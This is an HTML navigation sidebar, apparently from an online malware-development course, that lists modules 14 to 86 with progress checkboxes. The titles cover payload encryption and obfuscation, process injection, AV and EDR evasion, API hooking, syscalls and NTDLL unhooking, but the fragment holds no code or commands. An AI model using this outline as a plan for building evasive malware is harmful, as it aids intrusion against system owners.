                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Payload Placement - .text Section
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Payload Placement - .rsrc Section
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Introduction To Payload Encryption
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Payload Encryption - XOR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Payload Encryption - RC4
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Payload Encryption - AES Encryption
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Evading Microsoft Defender Static Analysis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Payload Obfuscation - IPv4/IPv6Fuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Payload Obfuscation - MACFuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Payload Obfuscation - UUIDFuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Maldev Academy Tool - HellShell
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Maldev Academy Tool - MiniShell
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - Local Payload Execution - DLL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Local Payload Execution - Shellcode
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Process Injection - DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Process Injection - Shellcode Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - Payload Staging - Web Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Payload Staging - Windows Registry
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Binary Signing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Process Enumeration - EnumProcesses
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - Process Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Thread Hijacking - Local Thread Creation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Thread Hijacking - Remote Thread Creation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Thread Hijacking - Local Thread Enumeration
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Thread Hijacking - Remote Thread Enumeration
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - APC Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Early Bird APC Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Callback Code Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Local Mapping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Remote Mapping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Local Function Stomping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Remote Function Stomping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Payload Execution Control
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Spoofing PPID
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Argument Spoofing (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Process Argument Spoofing (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Parsing PE Headers
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - String Hashing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - IAT Hiding &amp; Obfuscation - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - IAT Hiding &amp; Obfuscation - Custom GetProcAddress
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - IAT Hiding &amp; Obfuscation - Custom GetModuleHandle
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - IAT Hiding &amp; Obfuscation - API Hashing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - IAT Hiding &amp; Obfuscation - Custom Pseudo Handles
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - IAT Hiding &amp; Obfuscation - Compile Time API Hashing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - API Hooking - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - API Hooking - Detours Library
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - API Hooking - Minhook Library
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - API Hooking - Custom Code
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - API Hooking - Using Windows APIs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Syscalls - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Syscalls - Userland Hooking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - Syscalls - SysWhispers
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Syscalls - Hell's Gate
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Syscalls - Reimplementing Classic Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Syscalls - Reimplementing Mapping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Syscalls - Reimplementing APC Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Anti-Analysis - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Anti-Debugging - Multiple Techniques
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - Anti-Debugging - Self-Deletion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - Anti-Virtual Environments - Multiple Techniques
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - Anti-Virtual Environments - Multiple Delay Execution Techniques
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Anti-Virtual Environments - API Hammering
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Binary Entropy Reduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Brute Force Decryption
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - MalDev Academy Tool - KeyGuard
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - CRT Library Removal &amp; Malware Compiling
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - IAT Camouflage
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 81 - Bypassing AVs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Introduction To EDRs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-83" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./83.html">
                    <div for="module-83" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 83 - NTDLL Unhooking - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-84" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./84.html">
                    <div for="module-84" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 84 - NTDLL Unhooking - From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-85" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./85.html">
                    <div for="module-85" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 85 - NTDLL Unhooking - From KnownDlls Directory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-86" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./86.html">
                    <div for="module-86" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 86 - NTDLL Unhooking - From a Suspended Process
                    </div>
                </a>
            </div>
